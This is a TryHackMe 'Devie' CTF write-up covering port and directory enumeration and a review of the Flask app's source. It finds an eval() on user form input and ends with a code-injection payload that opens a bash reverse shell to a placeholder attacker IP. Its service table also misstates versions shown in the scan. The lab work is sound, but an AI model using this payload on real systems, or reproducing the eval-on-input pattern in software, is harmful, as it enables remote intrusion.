# Hack Log 12 - TryHackMe [Devie](https://tryhackme.com/room/devie)

📆:**Date:** 2025-07-25  
🔍**Objective:** Obtain user and root flags.  
🎯**Target**: TryHackme Devie (Lab CTF)  

---  

## 🛠️ Actions Taken  

### 🧰 Port and Service Enumeration  

```bash
nmap -sV -sC 10.201.67.240
```

```bash
root@ip-10-201-112-219:~# nmap -sV -sC 10.201.67.240
Starting Nmap 7.80 ( https://nmap.org ) at 2025-08-15 05:00 BST
Nmap scan report for ip-10-201-67-240.ec2.internal (10.201.67.240)
Host is up (0.0028s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.8.10
|     Date: Fri, 15 Aug 2025 04:00:46 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 4486
|     Connection: close
```
| Port    | Service  | Description                    |
|---------|----------|--------------------------------|
| 22 | ssh    | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)|                 |
| 5000 | upnp?    | Werkzeug/2.1.2 Python/2.8.10                  |  

&rarr; Werkzeug is running on port 5000.  

### 📁 Directory Enumeration  

```bash
root@ip-10-201-112-219:~# ffuf -w /usr/share/wordlists/dirb/big.txt -u http://10.201.67.240:5000/FUZZ 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://10.201.67.240:5000/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

:: Progress: [20469/20469] :: Job [1/1] :: 1051 req/sec :: Duration: [0:00:18] :: Errors: 0 ::
```
&rarr; No significant results were found after trying multiple wordlists.  

### 🔎 Active Recon  

→ Opened the site hosted at port 5000.  
→ It was a webpage having multiple input fields to input values and perform mathematical operations on them.  
→ Upon exploring the main page found a link to download the "source code".  
→ Downloaded the source code as "source.zip" and unzipped it.  
  - Following files were present  
       ```bash
       root@ip-10-201-112-219:~# cd math/
       root@ip-10-201-112-219:~/math# ls -la
       total 28
       drwxr-xr-x  3 root root 4096 Feb 20  2023 .
       drwxr-xr-x 51 root root 4096 Aug 15 05:41 ..
       -rw-rw-r--  1 root root 3453 Feb 19  2023 app.py
       -rw-rw-r--  1 root root  219 May 12  2022 bisection.py
       -rw-rw-r--  1 root root  149 May 12  2022 prime.py
       -rw-rw-r--  1 root root  284 May 12  2022 quadratic.py
        drwxrwxr-x  2 root root 4096 Feb 19  2023 templates
        ```

### 🔎 Code Analysis 

- bisection.py
  ```python
  from wtforms import Form, StringField, validators

  class InputForm3(Form):
    xa = StringField(default=1,validators=[validators.InputRequired()])
    xb = StringField(default=3,validators=[validators.InputRequired()])
  ```
- prime.py
  ```python
  from wtforms import Form, FloatField, validators

  class InputForm2(Form):
    number = FloatField(default=3,validators=[validators.InputRequired()])
  ```
- quadratic.py
  ```python
  from wtforms import Form, FloatField, validators

  class InputForm1(Form):
    a = FloatField(default=1,validators=[validators.InputRequired()])
    b = FloatField(default=3,validators=[validators.InputRequired()])
    c = FloatField(default=1,validators=[validators.InputRequired()])
  ```
→ Nothing of interest here in these python files. Just definitions for input fields.  
→ Analyzing "app.py"

- app.py
  ```python
  from quadratic import InputForm1
  from prime import InputForm2
  from bisection import InputForm3
  from flask import Flask, request, render_template
  import math

  app = Flask(__name__)

  @app.route('/', methods=['GET','POST']) #Applies to get GET when we load the site and POST
  def index():
    form1 = InputForm1(request.form) #Calling the class from the model.py. This is where the GET comes from
    form2 = InputForm2(request.form)
    form3 = InputForm3(request.form)
    if request.method == 'POST' and form1.validate(): 
        result1, result2 = compute(form1.a.data, form1.b.data,form1.c.data) #Calling the variables from the form
        pn = None
        root = None
    elif request.method == 'POST' and form2.validate(): 
        pn = primef(form2.number.data)
        result1 = None
        result2 = None
        root = None
    elif request.method == 'POST' and form3.validate():
        root = bisect(form3.xa.data, form3.xb.data)
        pn = None
        result1 = None
        result2 = None
    else:
        result1 = None #Otherwise is none so no display
        result2 = None
        pn = None
        root = None
    return render_template('index.html',form1=form1, form2=form2, form3=form3, result1=result1, result2=result2,pn = pn, root=root) #Display the page

  @app.route("/")
  def compute(a,b,c):
    disc = b*b - 4*a*c
    n_format = "{0:.2f}" #Format to 2 decimal spaces
    if disc > 0:
        result1 = (-b + math.sqrt(disc)) / 2*a
        result2 = (-b - math.sqrt(disc)) / 2*a
        result1 = float(n_format.format(result1))
        result2 = float(n_format.format(result2))
    elif disc == 0:
        result1 = (-b + math.sqrt(disc)) / 2*a
        result2 = None
        result1 = float(n_format.format(result1))
    else:
        result1 = "" #Empty string for the purpose of no real roots
        result2 = ""
    return result1, result2

  @app.route("/")
  def primef(n):
    pc = 0
    n = int(n)
    for i in range(2,n): #From 2 up to the number
        p = n % i #Get the remainder
        if p == 0: #If it equals 0
            pc = 1 #Then its not prime and break the loop
            break
    if pc == 1:
        pn = 1
        return pn
    elif pc == 0:
        pn = 0
        return pn

  @app.route("/")
  def bisect(xa,xb):
    added = xa + " + " + xb
    c = eval(added)
    c = int(c)/2
    ya = (int(xa)**6) - int(xa) - 1 #f(a)
    yb = (int(xb)**6) - int(xb) - 1 #f(b)
    
    if ya > 0 and yb > 0: #If they are both positive, since we are checking for one root between the points, not two. Then if both positive, no root
        root = 0
        return root
    else:
        e = 0.0001 #When to stop checking, number is really small

        l = 0 #Loop
        while l < 1: #Endless loop until condition is met
            d = int(xb) - c #Variable d to check for e
            if d <= e: #If d < e then we break the loop
                l = l + 1
            else:
                yc = (c**6) - c - 1 #f(c)
                if yc > 0: #If f(c) is positive then we switch the b variable with c and get the new c variable
                    xb = c
                    c = (int(xa) + int(xb))/2
                elif yc < 0: #If (c) is negative then we switch the a variable instead
                    xa = c 
                    c = (int(xa) + int(xb))/2
        c_format = "{0:.4f}"
        root = float(c_format.format(c))
        return root
    
  if __name__=="__main__":
    app.run("0.0.0.0",5000)
  ```

### eval() as Attack Surface
→ After looking carefully there is a "bisect()" function, in this function we see
  ```python
  def bisect(xa,xb):
    added = xa + " + " + xb
    c = eval(added)
    c = int(c)/2
  ```
  - eval() function is being used. eval() function is used for evaluating expression but this can be vulnerable as it can lead to code execution.  
  - Here eval() is evaluating "added" variable which is defined as
    ```python
    added = xa + " + " + xb
    ```
  - Therefore it is possible to inject code via manipulating the values of "xa" and "xb".
  - And in the webpage there are input fields to provide input for "xa" and "xb".

### Blind Remote Code Execution  

→ Started netcat listener on attacking machine on port 1234.  
→ In the input fields for "xa" and "xb" injected the payload as:
  ```bash
  xa = __import__('os').system("bash -c 'bash -i >& /dev/tcp/<Attacker-IP>/<Port> 0>&1'")#
  xb = 0
  ```
  - The "#" in the end will comment out rest of the part of the expression. 




